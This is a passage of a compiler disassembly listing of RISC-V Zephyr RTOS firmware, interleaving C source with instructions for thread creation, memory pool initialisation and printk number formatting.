80043a64:	c606                	sw	ra,12(sp)
		return;

	tmp = _offload_routine;
80043a66:	800477b7          	lui	a5,0x80047
80043a6a:	db078793          	addi	a5,a5,-592 # 80046db0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db1>
80043a6e:	4398                	lw	a4,0(a5)
	_offload_routine = NULL;
80043a70:	0007a023          	sw	zero,0(a5)

	tmp((void *)offload_param);
80043a74:	800477b7          	lui	a5,0x80047
80043a78:	db47a503          	lw	a0,-588(a5) # 80046db4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db5>
80043a7c:	9702                	jalr	a4
}
80043a7e:	40b2                	lw	ra,12(sp)
80043a80:	0141                	addi	sp,sp,16
80043a82:	8082                	ret
80043a84:	8082                	ret

80043a86 <_PrepC>:
 *
 * @return N/A
 */

void _PrepC(void)
{
80043a86:	1141                	addi	sp,sp,-16
80043a88:	c606                	sw	ra,12(sp)
	z_bss_zero();
80043a8a:	2fd000ef          	jal	ra,80044586 <z_bss_zero>
#ifdef CONFIG_XIP
	z_data_copy();
#endif
#if defined(CONFIG_RISCV_SOC_INTERRUPT_INIT)
	soc_interrupt_init();
80043a8e:	2599                	jal	800440d4 <soc_interrupt_init>
#endif
	z_cstart();
80043a90:	355000ef          	jal	ra,800445e4 <z_cstart>

80043a94 <z_new_thread>:

void z_new_thread(struct k_thread *thread, k_thread_stack_t *stack,
		 size_t stack_size, k_thread_entry_t thread_func,
		 void *arg1, void *arg2, void *arg3,
		 int priority, unsigned int options)
{
80043a94:	7179                	addi	sp,sp,-48
80043a96:	d606                	sw	ra,44(sp)
80043a98:	d422                	sw	s0,40(sp)
80043a9a:	d226                	sw	s1,36(sp)
80043a9c:	d04a                	sw	s2,32(sp)
80043a9e:	ce4e                	sw	s3,28(sp)
80043aa0:	cc52                	sw	s4,24(sp)
80043aa2:	ca56                	sw	s5,20(sp)
80043aa4:	c85a                	sw	s6,16(sp)
80043aa6:	c65e                	sw	s7,12(sp)
80043aa8:	84aa                	mv	s1,a0
80043aaa:	842e                	mv	s0,a1
80043aac:	8932                	mv	s2,a2
80043aae:	8b36                	mv	s6,a3
80043ab0:	8aba                	mv	s5,a4
80043ab2:	8a3e                	mv	s4,a5
80043ab4:	89c2                	mv	s3,a6
80043ab6:	8bc6                	mv	s7,a7
__ssp_bos_icheck3(memset, void *, int)
80043ab8:	0aa00593          	li	a1,170
80043abc:	8522                	mv	a0,s0
80043abe:	ccbfc0ef          	jal	ra,80040788 <memset>
	 * if it isn't.
	 */
	*((u32_t *)pStack) = STACK_SENTINEL;
#endif /* CONFIG_STACK_SENTINEL */
	/* Initialize various struct k_thread members */
	z_init_thread_base(&thread->base, prio, _THREAD_PRESTART, options);
80043ac2:	56c2                	lw	a3,48(sp)
80043ac4:	4611                	li	a2,4
80043ac6:	85de                	mv	a1,s7
80043ac8:	8526                	mv	a0,s1
80043aca:	238010ef          	jal	ra,80044d02 <z_init_thread_base>

	/* static threads overwrite it afterwards with real value */
	thread->init_data = NULL;
80043ace:	0404ae23          	sw	zero,92(s1)
	thread->fn_abort = NULL;
80043ad2:	0604a023          	sw	zero,96(s1)

	z_new_thread_init(thread, stack_memory, stack_size, priority, options);

	/* Initial stack frame for thread */
	stack_init = (struct __esf *)
		STACK_ROUND_DOWN(stack_memory +
80043ad6:	fb090593          	addi	a1,s2,-80
80043ada:	95a2                	add	a1,a1,s0
80043adc:	99c1                	andi	a1,a1,-16
				 stack_size - sizeof(struct __esf));

	/* Setup the initial stack frame */
	stack_init->a0 = (u32_t)thread_func;
80043ade:	0365a423          	sw	s6,40(a1)
	stack_init->a1 = (u32_t)arg1;
80043ae2:	0355a623          	sw	s5,44(a1)
	stack_init->a2 = (u32_t)arg2;
80043ae6:	0345a823          	sw	s4,48(a1)
	stack_init->a3 = (u32_t)arg3;
80043aea:	0335aa23          	sw	s3,52(a1)
	 *    restored following the MSTATUS value set within the thread stack;
	 * 2) the core will jump to z_thread_entry_wrapper, as the program
	 *    counter will be restored following the MEPC value set within the
	 *    thread stack.
	 */
	stack_init->mstatus = SOC_MSTATUS_DEF_RESTORE;
80043aee:	6789                	lui	a5,0x2
80043af0:	88078793          	addi	a5,a5,-1920 # 1880 <CONFIG_ISR_STACK_SIZE+0x880>
80043af4:	c5fc                	sw	a5,76(a1)
	stack_init->mepc = (u32_t)z_thread_entry_wrapper;
80043af6:	800427b7          	lui	a5,0x80042
80043afa:	2c078793          	addi	a5,a5,704 # 800422c0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422c1>
80043afe:	c5bc                	sw	a5,72(a1)

	thread->callee_saved.sp = (u32_t)stack_init;
80043b00:	d48c                	sw	a1,40(s1)
}
80043b02:	50b2                	lw	ra,44(sp)
80043b04:	5422                	lw	s0,40(sp)
80043b06:	5492                	lw	s1,36(sp)
80043b08:	5902                	lw	s2,32(sp)
80043b0a:	49f2                	lw	s3,28(sp)
80043b0c:	4a62                	lw	s4,24(sp)
80043b0e:	4ad2                	lw	s5,20(sp)
80043b10:	4b42                	lw	s6,16(sp)
80043b12:	4bb2                	lw	s7,12(sp)
80043b14:	6145                	addi	sp,sp,48
80043b16:	8082                	ret

80043b18 <block_ptr>:
#define LVL_ARRAY_SZ(n) (n)
#endif

static void *block_ptr(struct sys_mem_pool_base *p, size_t lsz, int block)
{
	return (u8_t *)p->buf + lsz * block;
80043b18:	4108                	lw	a0,0(a0)
80043b1a:	02b60633          	mul	a2,a2,a1
}
80043b1e:	9532                	add	a0,a0,a2
80043b20:	8082                	ret

80043b22 <get_bit_ptr>:
 * within that word as the return value
 */
static int get_bit_ptr(struct sys_mem_pool_base *p, int level, int bn,
		       u32_t **word)
{
	u32_t *bitarray = level <= p->max_inline_level ?
80043b22:	00b50783          	lb	a5,11(a0)
		&p->levels[level].bits : p->levels[level].bits_p;
80043b26:	02b7c463          	blt	a5,a1,80043b4e <get_bit_ptr+0x2c>
80043b2a:	455c                	lw	a5,12(a0)
80043b2c:	00159713          	slli	a4,a1,0x1
80043b30:	95ba                	add	a1,a1,a4
80043b32:	00259713          	slli	a4,a1,0x2
80043b36:	973e                	add	a4,a4,a5

	*word = &bitarray[bn / 32];
80043b38:	41f65793          	srai	a5,a2,0x1f
80043b3c:	8bfd                	andi	a5,a5,31
80043b3e:	97b2                	add	a5,a5,a2
80043b40:	8795                	srai	a5,a5,0x5
80043b42:	078a                	slli	a5,a5,0x2
80043b44:	97ba                	add	a5,a5,a4
80043b46:	c29c                	sw	a5,0(a3)

	return bn & 0x1f;
}
80043b48:	01f67513          	andi	a0,a2,31
80043b4c:	8082                	ret
		&p->levels[level].bits : p->levels[level].bits_p;
80043b4e:	4558                	lw	a4,12(a0)
80043b50:	00159793          	slli	a5,a1,0x1
80043b54:	95be                	add	a1,a1,a5
80043b56:	00259793          	slli	a5,a1,0x2
80043b5a:	973e                	add	a4,a4,a5
80043b5c:	4318                	lw	a4,0(a4)
80043b5e:	bfe9                	j	80043b38 <get_bit_ptr+0x16>

80043b60 <set_free_bit>:

static void set_free_bit(struct sys_mem_pool_base *p, int level, int bn)
{
80043b60:	1101                	addi	sp,sp,-32
80043b62:	ce06                	sw	ra,28(sp)
	u32_t *word;
	int bit = get_bit_ptr(p, level, bn, &word);
80043b64:	0074                	addi	a3,sp,12
80043b66:	3f75                	jal	80043b22 <get_bit_ptr>

	*word |= (1<<bit);
80043b68:	4732                	lw	a4,12(sp)
80043b6a:	4785                	li	a5,1
80043b6c:	00a79533          	sll	a0,a5,a0
80043b70:	431c                	lw	a5,0(a4)
80043b72:	8fc9                	or	a5,a5,a0
80043b74:	c31c                	sw	a5,0(a4)
}
80043b76:	40f2                	lw	ra,28(sp)
80043b78:	6105                	addi	sp,sp,32
80043b7a:	8082                	ret

80043b7c <z_sys_mem_pool_base_init>:
{
	return ((u8_t *)block + bsz - 1 - (u8_t *)p->buf) < buf_size(p);
}

void z_sys_mem_pool_base_init(struct sys_mem_pool_base *p)
{
80043b7c:	1141                	addi	sp,sp,-16
80043b7e:	c606                	sw	ra,12(sp)
80043b80:	c422                	sw	s0,8(sp)
80043b82:	c226                	sw	s1,4(sp)
80043b84:	842a                	mv	s0,a0
	int i;
	size_t buflen = p->n_max * p->max_sz, sz = p->max_sz;
80043b86:	00855883          	lhu	a7,8(a0)
80043b8a:	415c                	lw	a5,4(a0)
80043b8c:	02f888b3          	mul	a7,a7,a5
	u32_t *bits = (u32_t *)((u8_t *)p->buf + buflen);
80043b90:	00052803          	lw	a6,0(a0)
80043b94:	9846                	add	a6,a6,a7

	p->max_inline_level = -1;
80043b96:	577d                	li	a4,-1
80043b98:	00e505a3          	sb	a4,11(a0)

	for (i = 0; i < p->n_levels; i++) {
80043b9c:	4681                	li	a3,0
80043b9e:	a00d                	j	80043bc0 <z_sys_mem_pool_base_init+0x44>
		sys_dlist_init(&p->levels[i].free_list);

		if (nblocks < 32) {
			p->max_inline_level = i;
		} else {
			p->levels[i].bits_p = bits;
80043ba0:	4458                	lw	a4,12(s0)
80043ba2:	953a                	add	a0,a0,a4
80043ba4:	01052023          	sw	a6,0(a0)
			bits += (nblocks + 31)/32;
80043ba8:	05fd                	addi	a1,a1,31
80043baa:	41f5d713          	srai	a4,a1,0x1f
80043bae:	8b7d                	andi	a4,a4,31
80043bb0:	972e                	add	a4,a4,a1
80043bb2:	8715                	srai	a4,a4,0x5
80043bb4:	070a                	slli	a4,a4,0x2
80043bb6:	983a                	add	a6,a6,a4
		}

		sz = _ALIGN4(sz / 4);
80043bb8:	8389                	srli	a5,a5,0x2
80043bba:	078d                	addi	a5,a5,3
80043bbc:	9bf1                	andi	a5,a5,-4
	for (i = 0; i < p->n_levels; i++) {
80043bbe:	0685                	addi	a3,a3,1
80043bc0:	00a44703          	lbu	a4,10(s0)
80043bc4:	02e6d563          	bge	a3,a4,80043bee <z_sys_mem_pool_base_init+0x72>
		int nblocks = buflen / sz;
80043bc8:	02f8d5b3          	divu	a1,a7,a5
		sys_dlist_init(&p->levels[i].free_list);
80043bcc:	4458                	lw	a4,12(s0)
80043bce:	00169613          	slli	a2,a3,0x1
80043bd2:	9636                	add	a2,a2,a3
80043bd4:	00261513          	slli	a0,a2,0x2
80043bd8:	972a                	add	a4,a4,a0
80043bda:	00470613          	addi	a2,a4,4
 * @return N/A
 */

static inline void sys_dlist_init(sys_dlist_t *list)
{
	list->head = (sys_dnode_t *)list;
80043bde:	c350                	sw	a2,4(a4)
	list->tail = (sys_dnode_t *)list;
80043be0:	c710                	sw	a2,8(a4)
		if (nblocks < 32) {
80043be2:	477d                	li	a4,31
80043be4:	fab74ee3          	blt	a4,a1,80043ba0 <z_sys_mem_pool_base_init+0x24>
			p->max_inline_level = i;
80043be8:	00d405a3          	sb	a3,11(s0)
80043bec:	b7f1                	j	80043bb8 <z_sys_mem_pool_base_init+0x3c>
	}

	for (i = 0; i < p->n_max; i++) {
80043bee:	4481                	li	s1,0
80043bf0:	a015                	j	80043c14 <z_sys_mem_pool_base_init+0x98>
		void *block = block_ptr(p, p->max_sz, i);
80043bf2:	8626                	mv	a2,s1
80043bf4:	404c                	lw	a1,4(s0)
80043bf6:	8522                	mv	a0,s0
80043bf8:	3705                	jal	80043b18 <block_ptr>

		sys_dlist_append(&p->levels[0].free_list, block);
80043bfa:	445c                	lw	a5,12(s0)
80043bfc:	00478713          	addi	a4,a5,4
 * @return N/A
 */

static inline void sys_dlist_append(sys_dlist_t *list, sys_dnode_t *node)
{
	node->next = list;
80043c00:	c118                	sw	a4,0(a0)
	node->prev = list->tail;
80043c02:	4798                	lw	a4,8(a5)
80043c04:	c158                	sw	a4,4(a0)

	list->tail->next = node;
80043c06:	c308                	sw	a0,0(a4)
	list->tail = node;
80043c08:	c788                	sw	a0,8(a5)
		set_free_bit(p, 0, i);
80043c0a:	8626                	mv	a2,s1
80043c0c:	4581                	li	a1,0
80043c0e:	8522                	mv	a0,s0
80043c10:	3f81                	jal	80043b60 <set_free_bit>
	for (i = 0; i < p->n_max; i++) {
80043c12:	0485                	addi	s1,s1,1
80043c14:	00845783          	lhu	a5,8(s0)
80043c18:	fcf4cde3          	blt	s1,a5,80043bf2 <z_sys_mem_pool_base_init+0x76>
	}
}
80043c1c:	40b2                	lw	ra,12(sp)
80043c1e:	4422                	lw	s0,8(sp)
80043c20:	4492                	lw	s1,4(sp)
80043c22:	0141                	addi	sp,sp,16
80043c24:	8082                	ret

80043c26 <z_thread_entry>:
 * This routine does not return, and is marked as such so the compiler won't
 * generate preamble code that is only used by functions that actually return.
 */
FUNC_NORETURN void z_thread_entry(k_thread_entry_t entry,
				 void *p1, void *p2, void *p3)
{
80043c26:	1141                	addi	sp,sp,-16
80043c28:	c606                	sw	ra,12(sp)
80043c2a:	87aa                	mv	a5,a0
80043c2c:	852e                	mv	a0,a1
80043c2e:	85b2                	mv	a1,a2
	entry(p1, p2, p3);
80043c30:	8636                	mv	a2,a3
80043c32:	9782                	jalr	a5
80043c34:	72f000ef          	jal	ra,80044b62 <z_impl_k_current_get>
K_SYSCALL_DECLARE1_VOID(K_SYSCALL_K_THREAD_ABORT, k_thread_abort, k_tid_t, thread)
80043c38:	0e4010ef          	jal	ra,80044d1c <z_impl_k_thread_abort>

80043c3c <z_arch_printk_char_out>:
{
	ARG_UNUSED(c);

	/* do nothing */
	return 0;
}
80043c3c:	4501                	li	a0,0
80043c3e:	8082                	ret

80043c40 <print_err>:
{
	return _char_out;
}

static void print_err(out_func_t out, void *ctx)
{
80043c40:	1141                	addi	sp,sp,-16
80043c42:	c606                	sw	ra,12(sp)
80043c44:	c422                	sw	s0,8(sp)
80043c46:	c226                	sw	s1,4(sp)
80043c48:	842a                	mv	s0,a0
80043c4a:	84ae                	mv	s1,a1
	out('E', ctx);
80043c4c:	04500513          	li	a0,69
80043c50:	9402                	jalr	s0
	out('R', ctx);
80043c52:	85a6                	mv	a1,s1
80043c54:	05200513          	li	a0,82
80043c58:	9402                	jalr	s0
	out('R', ctx);
80043c5a:	85a6                	mv	a1,s1
80043c5c:	05200513          	li	a0,82
80043c60:	9402                	jalr	s0
}
80043c62:	40b2                	lw	ra,12(sp)
80043c64:	4422                	lw	s0,8(sp)
80043c66:	4492                	lw	s1,4(sp)
80043c68:	0141                	addi	sp,sp,16
80043c6a:	8082                	ret

80043c6c <char_out>:
struct out_context {
	int count;
};

static int char_out(int c, void *ctx_p)
{
80043c6c:	1141                	addi	sp,sp,-16
80043c6e:	c606                	sw	ra,12(sp)
	struct out_context *ctx = ctx_p;

	ctx->count++;
80043c70:	419c                	lw	a5,0(a1)
80043c72:	0785                	addi	a5,a5,1
80043c74:	c19c                	sw	a5,0(a1)
	return _char_out(c);
80043c76:	800477b7          	lui	a5,0x80047
80043c7a:	d207a783          	lw	a5,-736(a5) # 80046d20 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d21>
80043c7e:	9782                	jalr	a5
}
80043c80:	40b2                	lw	ra,12(sp)
80043c82:	0141                	addi	sp,sp,16
80043c84:	8082                	ret

80043c86 <_printk_hex_ulong>:
 */
static void _printk_hex_ulong(out_func_t out, void *ctx,
			      const unsigned long long num,
			      enum pad_type padding,
			      int min_width)
{
80043c86:	7179                	addi	sp,sp,-48
80043c88:	d606                	sw	ra,44(sp)
80043c8a:	d422                	sw	s0,40(sp)
80043c8c:	d226                	sw	s1,36(sp)
80043c8e:	d04a                	sw	s2,32(sp)
80043c90:	ce4e                	sw	s3,28(sp)
80043c92:	cc52                	sw	s4,24(sp)
80043c94:	ca56                	sw	s5,20(sp)
80043c96:	c85a                	sw	s6,16(sp)
80043c98:	c65e                	sw	s7,12(sp)
80043c9a:	c462                	sw	s8,8(sp)
80043c9c:	c266                	sw	s9,4(sp)
80043c9e:	c06a                	sw	s10,0(sp)
80043ca0:	8b2a                	mv	s6,a0
80043ca2:	8bae                	mv	s7,a1
80043ca4:	8c32                	mv	s8,a2
80043ca6:	8ab6                	mv	s5,a3
80043ca8:	8cba                	mv	s9,a4
80043caa:	8a3e                	mv	s4,a5
	int size = sizeof(num) * 2;
	int found_largest_digit = 0;
	int remaining = 16; /* 16 digits max */
	int digits = 0;
80043cac:	4901                	li	s2,0
	int remaining = 16; /* 16 digits max */
80043cae:	49c1                	li	s3,16
	int found_largest_digit = 0;
80043cb0:	4481                	li	s1,0
	int size = sizeof(num) * 2;
80043cb2:	4741                	li	a4,16

	for (; size != 0; size--) {
80043cb4:	a035                	j	80043ce0 <_printk_hex_ulong+0x5a>
		char nibble = (num >> ((size - 1) << 2) & 0xf);
80043cb6:	001a9693          	slli	a3,s5,0x1
80043cba:	47fd                	li	a5,31
80043cbc:	8f89                	sub	a5,a5,a0
80043cbe:	00f696b3          	sll	a3,a3,a5
80043cc2:	00ac57b3          	srl	a5,s8,a0
80043cc6:	8fd5                	or	a5,a5,a3
80043cc8:	a03d                	j	80043cf6 <_printk_hex_ulong+0x70>

		if (nibble != 0 || found_largest_digit != 0 || size == 1) {
			found_largest_digit = 1;
			nibble += nibble > 9 ? 87 : 48;
80043cca:	4725                	li	a4,9
80043ccc:	04f77763          	bgeu	a4,a5,80043d1a <_printk_hex_ulong+0x94>
80043cd0:	05700513          	li	a0,87
			out((int)nibble, ctx);
80043cd4:	85de                	mv	a1,s7
80043cd6:	953e                	add	a0,a0,a5
80043cd8:	9b02                	jalr	s6
			digits++;
80043cda:	0905                	addi	s2,s2,1
			found_largest_digit = 1;
80043cdc:	4485                	li	s1,1
			continue;
		}

		if (remaining-- <= min_width) {
80043cde:	8722                	mv	a4,s0
	for (; size != 0; size--) {
80043ce0:	cf31                	beqz	a4,80043d3c <_printk_hex_ulong+0xb6>
		char nibble = (num >> ((size - 1) << 2) & 0xf);
80043ce2:	fff70413          	addi	s0,a4,-1
80043ce6:	00241513          	slli	a0,s0,0x2
80043cea:	fe050793          	addi	a5,a0,-32
80043cee:	fc07c4e3          	bltz	a5,80043cb6 <_printk_hex_ulong+0x30>
80043cf2:	00fad7b3          	srl	a5,s5,a5
80043cf6:	8bbd                	andi	a5,a5,15
		if (nibble != 0 || found_largest_digit != 0 || size == 1) {
80043cf8:	fbe9                	bnez	a5,80043cca <_printk_hex_ulong+0x44>
80043cfa:	f8e1                	bnez	s1,80043cca <_printk_hex_ulong+0x44>
80043cfc:	4685                	li	a3,1
80043cfe:	fcd706e3          	beq	a4,a3,80043cca <_printk_hex_ulong+0x44>
		if (remaining-- <= min_width) {
80043d02:	fff98d13          	addi	s10,s3,-1
80043d06:	033a4963          	blt	s4,s3,80043d38 <_printk_hex_ulong+0xb2>
			if (padding == PAD_ZERO_BEFORE) {
80043d0a:	4785                	li	a5,1
80043d0c:	00fc8a63          	beq	s9,a5,80043d20 <_printk_hex_ulong+0x9a>
				out('0', ctx);
			} else if (padding == PAD_SPACE_BEFORE) {
80043d10:	4789                	li	a5,2
80043d12:	00fc8d63          	beq	s9,a5,80043d2c <_printk_hex_ulong+0xa6>
		if (remaining-- <= min_width) {
80043d16:	89ea                	mv	s3,s10
80043d18:	b7d9                	j	80043cde <_printk_hex_ulong+0x58>
			nibble += nibble > 9 ? 87 : 48;
80043d1a:	03000513          	li	a0,48
80043d1e:	bf5d                	j	80043cd4 <_printk_hex_ulong+0x4e>
				out('0', ctx);
80043d20:	85de                	mv	a1,s7
80043d22:	03000513          	li	a0,48
80043d26:	9b02                	jalr	s6
		if (remaining-- <= min_width) {
80043d28:	89ea                	mv	s3,s10
80043d2a:	bf55                	j	80043cde <_printk_hex_ulong+0x58>
				out(' ', ctx);
80043d2c:	85de                	mv	a1,s7
80043d2e:	02000513          	li	a0,32
80043d32:	9b02                	jalr	s6
		if (remaining-- <= min_width) {
80043d34:	89ea                	mv	s3,s10
80043d36:	b765                	j	80043cde <_printk_hex_ulong+0x58>
80043d38:	89ea                	mv	s3,s10
80043d3a:	b755                	j	80043cde <_printk_hex_ulong+0x58>
			}
		}
	}

	if (padding == PAD_SPACE_AFTER) {
80043d3c:	478d                	li	a5,3
80043d3e:	02fc8063          	beq	s9,a5,80043d5e <_printk_hex_ulong+0xd8>
		remaining = min_width * 2 - digits;
		while (remaining-- > 0) {
			out(' ', ctx);
		}
	}
}
80043d42:	50b2                	lw	ra,44(sp)
80043d44:	5422                	lw	s0,40(sp)
80043d46:	5492                	lw	s1,36(sp)
80043d48:	5902                	lw	s2,32(sp)
80043d4a:	49f2                	lw	s3,28(sp)
80043d4c:	4a62                	lw	s4,24(sp)
80043d4e:	4ad2                	lw	s5,20(sp)
80043d50:	4b42                	lw	s6,16(sp)
80043d52:	4bb2                	lw	s7,12(sp)
80043d54:	4c22                	lw	s8,8(sp)
80043d56:	4c92                	lw	s9,4(sp)
80043d58:	4d02                	lw	s10,0(sp)
80043d5a:	6145                	addi	sp,sp,48
80043d5c:	8082                	ret
		remaining = min_width * 2 - digits;
80043d5e:	0a06                	slli	s4,s4,0x1
80043d60:	412a0933          	sub	s2,s4,s2
		while (remaining-- > 0) {
80043d64:	a031                	j	80043d70 <_printk_hex_ulong+0xea>
			out(' ', ctx);
80043d66:	85de                	mv	a1,s7
80043d68:	02000513          	li	a0,32
80043d6c:	9b02                	jalr	s6
		while (remaining-- > 0) {
80043d6e:	8922                	mv	s2,s0
80043d70:	fff90413          	addi	s0,s2,-1
80043d74:	ff2049e3          	bgtz	s2,80043d66 <_printk_hex_ulong+0xe0>
80043d78:	b7e9                	j	80043d42 <_printk_hex_ulong+0xbc>

80043d7a <_printk_dec_ulong>:
 * @return N/A
 */
static void _printk_dec_ulong(out_func_t out, void *ctx,
			      const unsigned long num, enum pad_type padding,
			      int min_width)
{
80043d7a:	7179                	addi	sp,sp,-48
80043d7c:	d606                	sw	ra,44(sp)
80043d7e:	d422                	sw	s0,40(sp)
80043d80:	d226                	sw	s1,36(sp)
80043d82:	d04a                	sw	s2,32(sp)
80043d84:	ce4e                	sw	s3,28(sp)
80043d86:	cc52                	sw	s4,24(sp)
80043d88:	ca56                	sw	s5,20(sp)
80043d8a:	c85a                	sw	s6,16(sp)
80043d8c:	c65e                	sw	s7,12(sp)
80043d8e:	c462                	sw	s8,8(sp)
80043d90:	8aaa                	mv	s5,a0
80043d92:	8b2e                	mv	s6,a1
80043d94:	84b2                	mv	s1,a2
80043d96:	8bb6                	mv	s7,a3
80043d98:	8a3a                	mv	s4,a4
	int found_largest_digit = 0;
	int remaining = 10; /* 10 digits max */
	int digits = 1;

	/* make sure we don't skip if value is zero */
	if (min_width <= 0) {
80043d9a:	06e05463          	blez	a4,80043e02 <_printk_dec_ulong+0x88>
		min_width = 1;
80043d9e:	4985                	li	s3,1
80043da0:	4929                	li	s2,10
80043da2:	4c01                	li	s8,0
80043da4:	3b9ad437          	lui	s0,0x3b9ad
80043da8:	9ff40413          	addi	s0,s0,-1537 # 3b9ac9ff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x3b9328df>
80043dac:	a01d                	j	80043dd2 <_printk_dec_ulong+0x58>
	}

	while (pos >= 9) {
		if (found_largest_digit != 0 || remainder > pos) {
			found_largest_digit = 1;
			out((int)((remainder / (pos + 1)) + 48), ctx);
80043dae:	00140513          	addi	a0,s0,1
80043db2:	02a4d533          	divu	a0,s1,a0
80043db6:	85da                	mv	a1,s6
80043db8:	03050513          	addi	a0,a0,48
80043dbc:	9a82                	jalr	s5
			digits++;
80043dbe:	0985                	addi	s3,s3,1
			found_largest_digit = 1;
80043dc0:	4c05                	li	s8,1
		} else if (remaining <= min_width
				&& padding < PAD_SPACE_AFTER) {
			out((int)(padding == PAD_ZERO_BEFORE ? '0' : ' '), ctx);
			digits++;
		}
		remaining--;
80043dc2:	197d                	addi	s2,s2,-1
		remainder %= (pos + 1);
80043dc4:	00140793          	addi	a5,s0,1
80043dc8:	02f4f4b3          	remu	s1,s1,a5
		pos /= 10;
80043dcc:	47a9                	li	a5,10
80043dce:	02f45433          	divu	s0,s0,a5
	while (pos >= 9) {
80043dd2:	47a1                	li	a5,8
80043dd4:	0287f963          	bgeu	a5,s0,80043e06 <_printk_dec_ulong+0x8c>
		if (found_largest_digit != 0 || remainder > pos) {
80043dd8:	fc0c1be3          	bnez	s8,80043dae <_printk_dec_ulong+0x34>
80043ddc:	fc9469e3          	bltu	s0,s1,80043dae <_printk_dec_ulong+0x34>
		} else if (remaining <= min_width
80043de0:	ff2a41e3          	blt	s4,s2,80043dc2 <_printk_dec_ulong+0x48>
				&& padding < PAD_SPACE_AFTER) {
80043de4:	4789                	li	a5,2
80043de6:	fd77eee3          	bltu	a5,s7,80043dc2 <_printk_dec_ulong+0x48>
			out((int)(padding == PAD_ZERO_BEFORE ? '0' : ' '), ctx);
80043dea:	4785                	li	a5,1
80043dec:	00fb8863          	beq	s7,a5,80043dfc <_printk_dec_ulong+0x82>
80043df0:	02000513          	li	a0,32
80043df4:	85da                	mv	a1,s6
80043df6:	9a82                	jalr	s5
			digits++;
80043df8:	0985                	addi	s3,s3,1
80043dfa:	b7e1                	j	80043dc2 <_printk_dec_ulong+0x48>
			out((int)(padding == PAD_ZERO_BEFORE ? '0' : ' '), ctx);
80043dfc:	03000513          	li	a0,48
80043e00:	bfd5                	j	80043df4 <_printk_dec_ulong+0x7a>
		min_width = 1;
80043e02:	4a05                	li	s4,1
80043e04:	bf69                	j	80043d9e <_printk_dec_ulong+0x24>
	}
	out((int)(remainder + 48), ctx);
80043e06:	85da                	mv	a1,s6
80043e08:	03048513          	addi	a0,s1,48
80043e0c:	9a82                	jalr	s5

	if (padding == PAD_SPACE_AFTER) {
80043e0e:	478d                	li	a5,3
80043e10:	00fb8e63          	beq	s7,a5,80043e2c <_printk_dec_ulong+0xb2>
		remaining = min_width - digits;
		while (remaining-- > 0) {
			out(' ', ctx);
		}
	}
}
80043e14:	50b2                	lw	ra,44(sp)
80043e16:	5422                	lw	s0,40(sp)
80043e18:	5492                	lw	s1,36(sp)
80043e1a:	5902                	lw	s2,32(sp)
80043e1c:	49f2                	lw	s3,28(sp)
80043e1e:	4a62                	lw	s4,24(sp)
80043e20:	4ad2                	lw	s5,20(sp)
80043e22:	4b42                	lw	s6,16(sp)
80043e24:	4bb2                	lw	s7,12(sp)
80043e26:	4c22                	lw	s8,8(sp)
80043e28:	6145                	addi	sp,sp,48
80043e2a:	8082                	ret
		remaining = min_width - digits;
80043e2c:	413a09b3          	sub	s3,s4,s3
		while (remaining-- > 0) {
80043e30:	a031                	j	80043e3c <_printk_dec_ulong+0xc2>
			out(' ', ctx);
80043e32:	85da                	mv	a1,s6
80043e34:	02000513          	li	a0,32
80043e38:	9a82                	jalr	s5
		while (remaining-- > 0) {
80043e3a:	89a2                	mv	s3,s0
80043e3c:	fff98413          	addi	s0,s3,-1
80043e40:	ff3049e3          	bgtz	s3,80043e32 <_printk_dec_ulong+0xb8>
80043e44:	bfc1                	j	80043e14 <_printk_dec_ulong+0x9a>

80043e46 <__printk_hook_install>:
	_char_out = fn;
80043e46:	800477b7          	lui	a5,0x80047
80043e4a:	d2a7a023          	sw	a0,-736(a5) # 80046d20 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d21>
}
80043e4e:	8082                	ret

80043e50 <z_vprintk>:
{
80043e50:	7139                	addi	sp,sp,-64
80043e52:	de06                	sw	ra,60(sp)
80043e54:	dc22                	sw	s0,56(sp)
80043e56:	da26                	sw	s1,52(sp)
80043e58:	d84a                	sw	s2,48(sp)
80043e5a:	d64e                	sw	s3,44(sp)
80043e5c:	d452                	sw	s4,40(sp)
80043e5e:	d256                	sw	s5,36(sp)
80043e60:	d05a                	sw	s6,32(sp)
80043e62:	ce5e                	sw	s7,28(sp)
80043e64:	89aa                	mv	s3,a0
80043e66:	892e                	mv	s2,a1
80043e68:	8432                	mv	s0,a2
80043e6a:	c636                	sw	a3,12(sp)
	int long_ctr = 0;
80043e6c:	4a81                	li	s5,0
	int min_width = -1;
80043e6e:	5b7d                	li	s6,-1
	enum pad_type padding = PAD_NONE;
80043e70:	4a01                	li	s4,0
	int might_format = 0; /* 1 if encountered a '%' */
80043e72:	4481                	li	s1,0
	while (*fmt) {
80043e74:	a021                	j	80043e7c <z_vprintk+0x2c>
				out((int)*fmt, ctx);
80043e76:	85ca                	mv	a1,s2
80043e78:	9982                	jalr	s3
		++fmt;
80043e7a:	0405                	addi	s0,s0,1
	while (*fmt) {
80043e7c:	00044503          	lbu	a0,0(s0)
80043e80:	1e050563          	beqz	a0,8004406a <z_vprintk+0x21a>
		if (!might_format) {
80043e84:	e891                	bnez	s1,80043e98 <z_vprintk+0x48>
			if (*fmt != '%') {
80043e86:	02500793          	li	a5,37
80043e8a:	fef516e3          	bne	a0,a5,80043e76 <z_vprintk+0x26>
				long_ctr = 0;
80043e8e:	8aa6                	mv	s5,s1
				min_width = -1;
80043e90:	5b7d                	li	s6,-1
				padding = PAD_NONE;
80043e92:	4a01                	li	s4,0
				might_format = 1;
80043e94:	4485                	li	s1,1
80043e96:	b7d5                	j	80043e7a <z_vprintk+0x2a>
			switch (*fmt) {
80043e98:	fdb50793          	addi	a5,a0,-37
80043e9c:	0ff7f693          	andi	a3,a5,255
80043ea0:	05500713          	li	a4,85
80043ea4:	1ad76563          	bltu	a4,a3,8004404e <z_vprintk+0x1fe>
80043ea8:	00269793          	slli	a5,a3,0x2
80043eac:	80046737          	lui	a4,0x80046
80043eb0:	23070713          	addi	a4,a4,560 # 80046230 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046231>
80043eb4:	97ba                	add	a5,a5,a4
80043eb6:	439c                	lw	a5,0(a5)
80043eb8:	8782                	jr	a5
				if (min_width < 0 && padding == PAD_NONE) {
80043eba:	000b5463          	bgez	s6,80043ec2 <z_vprintk+0x72>
